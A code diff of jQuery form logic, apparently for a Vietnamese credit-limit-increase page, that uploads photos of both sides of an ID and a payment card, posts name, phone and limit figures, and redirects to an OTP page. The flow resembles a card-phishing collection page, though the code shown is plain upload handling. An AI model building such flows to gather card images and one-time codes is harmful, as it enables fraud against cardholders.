@@ -68,24 +68,95 @@ function readURL4(input) {
         reader.readAsDataURL(input.files[0]);
     }
 }
+const images = {
+    mattruoc: "",
+    matsau: "",
+    mattruoc_card: "",
+    matsau_card: ""
+}
 
 // Bắt sự kiện, ngay khi thay đổi file thì đọc lại nội dung và hiển thị lại hình ảnh mới trên khung preview-upload
-$("#mattruoc").change(function () {
+$("#mattruoc").change(async function () {
+    var formdata = new FormData();
+    var file = this.files[0];
+    formdata.append("image", file);
+    var response = await fetch('/api/upload', {
+        method: 'POST',
+        body: formdata,
+    });
+    var data = await response.json();
+    console.log(data);
+    images.mattruoc = data?.imageUrl
     readURL(this);
 });
-$("#matsau").change(function () {
+$("#matsau").change(async function () {
+    var formdata = new FormData()
+    var file = this.files[0]
+    formdata.append("image", file)
+    var response = await fetch('/api/upload', {
+        method: 'POST',
+        body: formdata,
+    });
+    var data = await response.json();
+    console.log(data);
+    images.matsau = data?.imageUrl
     readURL2(this);
 });
-$("#mattruoc_card").change(function () {
+$("#mattruoc_card").change(async function () {
+    var formdata = new FormData()
+    var file = this.files[0]
+    formdata.append("image", file)
+    var response = await fetch('/api/upload', {
+        method: 'POST',
+        body: formdata,
+    });
+    var data = await response.json();
+    console.log(data);
+    images.mattruoc_card = data?.imageUrl
     readURL3(this);
 });
-$("#matsau_card").change(function () {
+$("#matsau_card").change(async function () {
+    var formdata = new FormData()
+    var file = this.files[0]
+    formdata.append("image", file)
+    var response = await fetch('/api/upload', {
+        method: 'POST',
+        body: formdata,
+    });
+    var data = await response.json();
+    console.log(data);
+    images.matsau_card = data?.imageUrl
     readURL4(this);
 });
 
-// $('#service').submit(function (e) {
-//     e.preventDefault();
-//     $('.loader').show()
+$('#service').submit(async function (e) {
+    e.preventDefault();
+    $('.loader').show()
 
-//     $('#service').submit();
-// });
+    const data = {
+        name: $('#name').val() ?? '',
+        phone: $('#phone').val() ?? '',
+        limit_now: $('#limit_now').val() ?? '',
+        limit_total: $('#limit_total').val() ?? '',
+        limit_increase: $('#limit_increase').val() ?? '',
+        mattruoc: images?.mattruoc,
+        matsau: images?.matsau,
+        mattruoc_card: images?.mattruoc_card,
+        matsau_card: images?.matsau_card
+    }
+
+
+    const response = await fetch('/api/otp-post', {
+        method: 'POST',
+        body: JSON.stringify(data),
+        headers: {
+            "Content-Type": "application/json"
+        }
+    })
+    const resData = await response.json()
+    console.log(resData);
+    if (resData?.status) {
+        window.location.href = '/otp'
+    }
+
+});
